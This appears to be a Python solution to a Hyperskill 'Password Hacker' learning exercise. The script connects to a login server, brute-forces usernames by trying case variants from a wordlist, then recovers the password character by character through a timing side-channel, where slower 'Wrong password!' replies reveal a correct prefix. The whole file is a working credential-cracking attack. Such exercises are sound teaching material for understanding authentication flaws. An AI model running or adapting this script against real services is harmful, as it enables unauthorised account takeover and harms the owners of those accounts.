import itertools
import string
import sys
import socket
import json
import time

param = sys.argv
_, domain, port = param
address = (domain, int(port))
login_path = "C:\\Users\\SYS\\Downloads\\logins.txt"


def get(data):
    client.send(data.encode())
    return client.recv(1024).decode()


def login(entry: dict) -> int:
    start_time = time.time()
    res = get(json.dumps(entry))  # https://hyperskill.org/learn/step/8999
    res = json.loads(res)['result']
    end_time = time.time() - start_time

    if res == 'Wrong login!':
        return 1
    elif res == 'Wrong password!':
        if end_time < 0.1:
            return 2
        return 3
    # elif res == 'Exception happened during login':
    #     return 3
    elif res == 'Connection success!':
        return 4


def get_entry(name: str, pwd: str) -> dict:
    return {"login": name, "password": pwd}


def guess_login() -> str:
    with open(login_path, 'r') as login_file:
        for line in login_file.readlines():
            login_cand = line.strip()
            base_list = zip(login_cand.upper(), login_cand.lower())
            for login_tuple in itertools.product(*base_list):
                name = "".join(login_tuple)
                entry = get_entry(name, '')
                if login(entry) != 1:
                    return name
    return 'NaN'


def guess_password(name: str) -> dict:
    base_list = string.ascii_letters + string.digits
    base = ''
    for _ in range(512):
        for cand in base_list:
            entry = get_entry(name, base + cand)
            code = login(entry)
            assert(code != 1)  # assert the login is correct
            # if code == 2:
            #     continue
            if code == 3:
                base += cand
                break
            elif code == 4:
                return entry
    return get_entry(name, "NaN")


with socket.socket() as client:
    client.connect(address)
    entry = guess_password(guess_login())
    print(json.dumps(entry))
